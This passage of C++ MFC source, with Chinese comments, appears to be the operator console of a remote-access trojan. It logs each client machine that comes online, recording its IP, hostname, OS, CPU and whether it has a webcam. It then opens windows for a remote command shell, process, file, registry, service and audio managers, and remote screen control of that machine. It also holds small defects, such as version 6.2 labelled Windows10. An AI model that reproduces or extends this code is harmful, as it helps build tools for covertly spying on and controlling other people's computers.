		__ServerDlg->PostMessage(UM_OPEN_VIDEO_MAMAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_SERVICE_MANAGER_LIST_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_SERVICE_MAMAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}
	case CLIENT_REGISTER_MANAGER_REPLY:
	{
		__ServerDlg->PostMessage(UM_OPEN_REGISTER_MAMAGER_DIALOG, 0, (LPARAM)ContextObject);
		Sleep(10);
		break;
	}

	}

	return ;
}
//用户上线请求
LRESULT CServerDlg::OnClientLogin(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CString ClientAddress,HostName, ProcessorNameString, IsWebCamerExist,
		WebSpeed, OSName;
	CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)ParamterData2;
	if (ContextObject ==NULL)
	{
		return -1;
	}
	CString v1;
	try
	{
		int v20 = ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength();
		int v21 = sizeof(LOGIN_INFORMATION);

		if (ContextObject->m_ReceivedDecompressdBufferData.GetBufferLength()!=sizeof(LOGIN_INFORMATION))
		{
			return -1;
		}
		LOGIN_INFORMATION* LoginInfo =
			(LOGIN_INFORMATION*)ContextObject->m_ReceivedDecompressdBufferData.GetBuffer();
		sockaddr_in v2;
		memset(&v2, 0, sizeof(v2));
		int v3 = sizeof(sockaddr_in);
		getpeername(ContextObject->ClientSocket,(SOCKADDR*)&v2, &v3);
		ClientAddress = inet_ntoa(v2.sin_addr);

		//主机名称
		HostName = LoginInfo->HostName;
		switch (LoginInfo->OsVersionInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion<=4)
			{
				OSName = "WindowsNT";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion==5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "Windows2000";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "WindowsXP";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 5 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows2003";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 0)
			{
				OSName = "WindowsVista";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 1)
			{
				OSName = "Windows7";
			}
			if (LoginInfo->OsVersionInfoEx.dwMajorVersion == 6 && LoginInfo->OsVersionInfoEx.dwMinorVersion == 2)
			{
				OSName = "Windows10";
			}
		}
		//cpu
		ProcessorNameString = LoginInfo->ProcessNameString;
		//网速
		WebSpeed.Format("%d", LoginInfo->WebSpeed);
		IsWebCamerExist = LoginInfo->IsWebCameraExist ? "有" : "无";
		//向控件添加数据
		AddCtrlListServerOnline(ClientAddress,
			HostName,OSName,ProcessorNameString,
			IsWebCamerExist,WebSpeed,ContextObject);
		//ContextObject 是放在控件中的隐藏项中
	}
	catch (...)
	{

	}
	
}
//远程消息
LRESULT CServerDlg::OnRemoteMessageDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	//创建的一个远程消息对话框
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;
	//转到CFileManagerDlg  构造函数
	CDlgRemoteMessageDlg *Dialog = new CDlgRemoteMessageDlg(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面
	Dialog->Create(IDD_DIALOG_REMOTE_MESSAGE, GetDesktopWindow());    //创建非阻塞的Dlg
	Dialog->ShowWindow(SW_SHOW);
	//ContextObject->v1 = TALK_DLG;
	//ContextObject->hDlg = Dlg;
	return 0;
}

VOID CServerDlg::AddCtrlListServerOnline(CString ClientAddress, 
	CString HostName, CString OSName,
	CString ProcessorNameString, CString IsWebCamerExist,
	CString WebSpeed, CONTEXT_OBJECT* ContextObject)
{
	int i = m_CListCtrl_Server_Dialog_Online.InsertItem(m_CListCtrl_Server_Dialog_Online.GetItemCount(), ClientAddress);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 1, HostName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 2, OSName);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 3, ProcessorNameString);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 4, IsWebCamerExist);
	m_CListCtrl_Server_Dialog_Online.SetItemText(i, 5, WebSpeed);
	m_CListCtrl_Server_Dialog_Online.SetItemData(i, (ULONG_PTR)ContextObject);//插入到改行隐藏区
	ShowDialogMessage(TRUE, ClientAddress + "主机上线 ");
}


VOID CServerDlg::SendSelectedCommand(PBYTE BufferData, ULONG BufferLength)
{
	//从ListControl上的隐藏项中选取中客户端的Context
	//1[pcontext client]  2  3   //1    2
	POSITION Position = m_CListCtrl_Server_Dialog_Online.GetFirstSelectedItemPosition();  
	//改代码支持多项选择
	
	while (Position)
	{
		int	Item = m_CListCtrl_Server_Dialog_Online.GetNextSelectedItem(Position);
		//从列表条目中取出ClientContext结构体(隐藏数据项)
		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CListCtrl_Server_Dialog_Online.GetItemData(Item);

		__IOCPServer->OnPrepareSending(ContextObject, BufferData, BufferLength);
	
		// 发送获得驱动器列表数据包   //查看ClientContext结构体
       //Cleint   Context
	}
}
//远程CMD对话框

LRESULT CServerDlg::OnCmdManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	//创建的一个进程管理对话框
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgCmdManager *Dialog = new CDlgCmdManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_CMD_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = CMD_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}
//远程进程对话框
LRESULT CServerDlg::OnProcessManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	//创建的一个进程管理对话框
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;
	
	CDlgProcessManager *Dialog = new CDlgProcessManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_PROCESS_MANAGER, GetDesktopWindow());   
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = PROCESS_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnThreaderManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgThreaderManager *Dialog = new CDlgThreaderManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_THREADER_PROCESS_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = THREADER_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnHandleManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgHandleManager *Dialog = new CDlgHandleManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_HADNLE_PROCESS_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = HANDLE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnModuleManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgModuleManager *Dialog = new CDlgModuleManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_MODULE_PROCESS_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = MODULE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnWindowManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgWindowManager *Dialog = new CDlgWindowManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_WINDOW_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = WINDOW_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnRemoteControlDialog	(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgRemoteControl *Dialog = new CDlgRemoteControl(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_REMOTE_CONTROL, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = REMOTE_CONTROL_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnFileManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgFileManager *Dialog = new CDlgFileManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_FILE_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = FILE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnAudioManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgAudioManager *Dialog = new CDlgAudioManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_AUDIO_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = AUDIO_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}

LRESULT CServerDlg::OnVideoManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	
	return 0;
}


LRESULT CServerDlg::OnServiceManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgServiceManager *Dialog = new CDlgServiceManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_SERVICE_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = SERVICE_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}


LRESULT CServerDlg::OnRegisterManagerDialog(WPARAM ParamterData1, LPARAM ParamterData2)
{
	CONTEXT_OBJECT *ContextObject = (CONTEXT_OBJECT*)ParamterData2;

	CDlgRegisterManager *Dialog = new CDlgRegisterManager(this, __IOCPServer, ContextObject);
	// 设置父窗口为卓面 
	//创建非阻塞的Dlg
	Dialog->Create(IDD_DIALOG_REGISTER_MANAGER, GetDesktopWindow());
	Dialog->ShowWindow(SW_SHOW);
	ContextObject->DialogID = REGISTER_MANAGER_DIALOG;
	ContextObject->DialogHandle = Dialog;
	return 0;
}